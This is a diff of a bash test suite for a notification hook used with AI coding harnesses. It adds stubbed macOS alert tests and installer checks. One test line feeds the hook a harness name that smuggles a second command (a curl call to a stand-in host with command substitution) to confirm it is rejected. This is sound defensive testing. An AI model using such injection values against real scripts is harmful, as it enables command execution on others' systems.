@@ -9,19 +9,41 @@ cat > "$CURL" <<'EOF'
 printf '%s\n' "$*" >> "${MOCK_LOG:?}"
 EOF
 chmod +x "$CURL"
+# Recording osascript + Darwin uname stubs (AC6): the default-on mac lane must
+# never pop a real Notification Center alert; the Darwin stub lets the
+# credential-free assertions pass on Linux CI too.
+OSA="$TMP/osacalls"; : > "$OSA"; export OSA_LOG="$OSA"
+printf '#!/usr/bin/env bash\nprintf "%%s\\n" "${2:-}|${3:-}" >> "${OSA_LOG:-/dev/null}"\n' > "$TMP/osascript"; chmod +x "$TMP/osascript"
+printf '#!/usr/bin/env bash\necho Darwin\n' > "$TMP/uname"; chmod +x "$TMP/uname"
+# Failing osascript stub isolates "mac failure" from Pushover retry state.
+printf '#!/usr/bin/env bash\nexit 1\n' > "$TMP/osascript-fail"; chmod +x "$TMP/osascript-fail"
+osacount(){ wc -l < "$OSA" | tr -d ' '; }
 pass=0; fail=0
 ok(){ echo "ok: $1"; pass=$((pass+1)); }; no(){ echo "FAIL: $1"; fail=$((fail+1)); }
-run(){ printf '%s' "$2" | PATH="$TMP:$PATH" MOCK_LOG="$LOG" POLYTOKEN_PROJECT_PATH= AGENT_NOTIFY_STATE_DIR="$TMP/state" AGENT_NOTIFY_DELAY="${AGENT_NOTIFY_DELAY_TEST:-0.05}" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" "$1"; }
+run(){ : > "$OSA"; printf '%s' "$2" | PATH="$TMP:$PATH" MOCK_LOG="$LOG" OSA_LOG="$OSA" POLYTOKEN_PROJECT_PATH= AGENT_NOTIFY_STATE_DIR="$TMP/state" AGENT_NOTIFY_DELAY="${AGENT_NOTIFY_DELAY_TEST:-0.05}" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" "$1"; }
 count(){ wc -l < "$LOG" | tr -d ' '; }
 key(){ printf '%s' "${#1}:$1${#2}:$2" | sha256sum | awk '{print $1}'; }
-run_with_state(){ local h="$1" state="$2" payload="$3"; printf '%s' "$payload" | PATH="$TMP:$PATH" MOCK_LOG="$LOG" AGENT_NOTIFY_STATE_DIR="$state" AGENT_NOTIFY_DELAY=2 PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" "$h"; }
+run_with_state(){ local h="$1" state="$2" payload="$3"; printf '%s' "$payload" | PATH="$TMP:$PATH" MOCK_LOG="$LOG" OSA_LOG="$OSA" AGENT_NOTIFY_STATE_DIR="$state" AGENT_NOTIFY_DELAY=2 PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" "$h"; }
 wait_until(){ local deadline=$((SECONDS+5)); while [ "$SECONDS" -lt "$deadline" ]; do "$@" && return 0; sleep 0.02; done; return 1; }
 wait_count(){ [ "$(count)" = "$1" ]; }
 wait_text(){ grep -Fq -- "$1" "$LOG"; }
-# Prompt allow is unconditional (empty stdout = proceed); missing credentials and missing jq must not create work or call sender.
+# Prompt allow is unconditional (empty stdout = proceed); with no destination at all and missing jq, nothing runs.
 out="$(printf '%s' '{"event":"pre_user_prompt"}' | PATH="$TMP:/usr/bin:/bin" AGENT_NOTIFY_STATE_DIR="$TMP/nojq" bash "$HOOK" polytoken)" && [ -z "$out" ] && ok "prompt allows via empty stdout" || no "prompt allows via empty stdout"
-printf '%s' '{"hook_event_name":"Stop","session_id":"no-creds"}' | PATH="$TMP:$PATH" PUSHOVER_APP_TOKEN= PUSHOVER_USER_KEY= PUSHOVER_TOKEN= PUSHOVER_USER= AGENT_NOTIFY_STATE_DIR="$TMP/missing" AGENT_NOTIFY_DELAY=0.01 bash "$HOOK" claude
-wait_until wait_count 0 && [ ! -d "$TMP/missing" ] && ok "missing credentials fail open before worker" || no "missing credentials fail open before worker"
+# No-credentials, BRANCHED by mac availability (uname(Darwin) stub makes this
+# pass on Linux CI): when the mac lane is available the hook proceeds
+# credential-free — state dir created, osascript stub records, zero curl calls.
+: > "$LOG"; : > "$OSA"
+printf '%s' '{"hook_event_name":"Stop","session_id":"no-creds"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" OSA_LOG="$OSA" PUSHOVER_APP_TOKEN= PUSHOVER_USER_KEY= PUSHOVER_TOKEN= PUSHOVER_USER= AGENT_NOTIFY_STATE_DIR="$TMP/missing" AGENT_NOTIFY_DELAY=0.01 bash "$HOOK" claude
+wait_until test -s "$OSA" && [ -d "$TMP/missing" ] && [ "$(count)" = 0 ] && ok "credential-free mac stop mac-sends with zero curl" || no "credential-free mac stop mac-sends with zero curl"
+# Non-mac (uname says Linux): today's fail-open behavior — no state dir, silent.
+NONMAC="$TMP/nonmac"; mkdir -p "$NONMAC"; printf '#!/usr/bin/env bash\necho Linux\n' > "$NONMAC/uname"; chmod +x "$NONMAC/uname"
+printf '%s' '{"hook_event_name":"Stop","session_id":"no-creds-nomac"}' | PATH="$NONMAC:/usr/bin:/bin" PUSHOVER_APP_TOKEN= PUSHOVER_USER_KEY= PUSHOVER_TOKEN= PUSHOVER_USER= AGENT_NOTIFY_STATE_DIR="$TMP/missing-nomac" AGENT_NOTIFY_DELAY=0.01 bash "$HOOK" claude
+wait_until wait_count 0 && [ ! -d "$TMP/missing-nomac" ] && ok "non-mac missing credentials fail open before worker" || no "non-mac missing credentials fail open before worker"
+# The worker's mac send carries the SAME sanitized title/body the Pushover
+# curl receives (ac asserts run under creds; this one checks the mac lane).
+: > "$LOG"; : > "$OSA"
+run claude '{"hook_event_name":"Stop","session_id":"macbody","message":"mac body check"}'
+wait_until test -s "$OSA" && grep -Fq 'session=macbody' "$OSA" && ok "worker mac send receives the sanitized title/body" || no "worker mac send receives the sanitized title/body"
 # Unknown/hostile harness identities fail open before state or outbound work.
 : > "$LOG"; printf '%s' '{"hook_event_name":"Stop","session_id":"hostile"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" AGENT_NOTIFY_STATE_DIR="$TMP/hostile-state" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" 'claude;curl https://evil.invalid/$(python);AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' >/dev/null
 [ "$(count)" = 0 ] && [ ! -e "$TMP/hostile-state" ] && ok "unknown hostile harness fails open" || no "unknown hostile harness fails open"
@@ -39,8 +61,8 @@ wait_until wait_count 1 && [ "$(grep -Fc first "$LOG" || true)" = 0 ] && grep -q
 wait_until wait_count 2 && grep -q -- '--data-urlencode title=Agent ' "$LOG" && grep -q 'session=cross' "$LOG" && ok "cross-harness isolation and identity" || no "cross-harness isolation and identity"
 # Prompt cancellation is synchronous and prevents the delayed worker from sending.
 : > "$LOG"; AGENT_NOTIFY_DELAY_TEST=0.15 run claude '{"hook_event_name":"Stop","session_id":"cancel","message":"wait"}'
-out="$(printf '%s' '{"hook_event_name":"UserPromptSubmit","session_id":"cancel"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" AGENT_NOTIFY_STATE_DIR="$TMP/state" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" claude)"; [ -z "$out" ] || no "cancellation prevents delivery"
-! wait_until wait_text cancel && ok "cancellation prevents delivery" || no "cancellation prevents delivery"
+out="$(printf '%s' '{"hook_event_name":"UserPromptSubmit","session_id":"cancel"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" OSA_LOG="$OSA" AGENT_NOTIFY_STATE_DIR="$TMP/state" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" claude)"; [ -z "$out" ] || no "cancellation prevents delivery"
+! wait_until wait_text cancel && [ "$(osacount)" = 0 ] && ok "cancellation prevents delivery (and mac send)" || no "cancellation prevents delivery (and mac send)"
 # A newer generation invalidates the old worker before send.
 : > "$LOG"; AGENT_NOTIFY_DELAY_TEST=0.5 run claude '{"hook_event_name":"Stop","session_id":"stale","message":"old"}' & p1=$!
 K="$(key claude stale)"; wait_until test -s "$TMP/state/$K.gen"
@@ -176,9 +198,23 @@ grep -q 'DELAY="${AGENT_NOTIFY_DELAY:-60}"' "$HOOK" && ok "production delay defa
 # Exercise the actual Claude installer into a temporary destination, then verify status, content, and mode.
 DEST="$TMP/installed-claude"; HOME="$TMP/home"; mkdir -p "$HOME"
 if CLAUDE_CONFIG_DIR="$DEST" CLAUDE_CONFIG_TTY=/dev/null CLAUDE_CONFIG_OVERWRITE=1 bash "$REPO/install.sh" --target claude --overwrite >/dev/null 2>&1; then
-  [ -f "$DEST/hooks/agent-notify.sh" ] && cmp -s "$HOOK" "$DEST/hooks/agent-notify.sh" && [ -x "$DEST/hooks/agent-notify.sh" ] && ok "actual installer status, content, and mode" || no "actual installer status, content, and mode"
+  [ -f "$DEST/hooks/agent-notify.sh" ] && cmp -s "$HOOK" "$DEST/hooks/agent-notify.sh" && [ -x "$DEST/hooks/agent-notify.sh" ] && [ -f "$DEST/lib/notify-mac.sh" ] && ok "actual installer status, content, and mode" || no "actual installer status, content, and mode"
 else
   no "actual installer status, content, and mode"
+fi
+# Watchdog-only install path: install-session-watchdog.sh must place the mac
+# Notification Center module at ~/.claude/lib/ (no other suite covers it).
+# Skipped on hosts with launchctl: running the installer there would load a
+# real LaunchAgent. On Linux the installer stops at the launchctl step (after
+# the file copies), which is exactly what this check exercises.
+if command -v launchctl >/dev/null 2>&1; then
+  echo "SKIP: watchdog-only install check requires a host without launchctl" >&2
+else
+  WDHOME="$TMP/wd-home"; mkdir -p "$WDHOME"
+  HOME="$WDHOME" bash "$REPO/scripts/install-session-watchdog.sh" >/dev/null 2>&1
+  [ -f "$WDHOME/.claude/lib/notify-mac.sh" ] && cmp -s "$REPO/home/lib/notify-mac.sh" "$WDHOME/.claude/lib/notify-mac.sh" \
+    && [ -f "$WDHOME/.claude/session-watchdog.sh" ] \
+    && ok "watchdog-only install places the mac module" || no "watchdog-only install places the mac module"
 fi
 # Exercise the actual Polytoken installer when its required yq-v4 dependency exists.
 if command -v yq >/dev/null 2>&1 && yq --version 2>/dev/null | grep -Eq 'version v4\.'; then
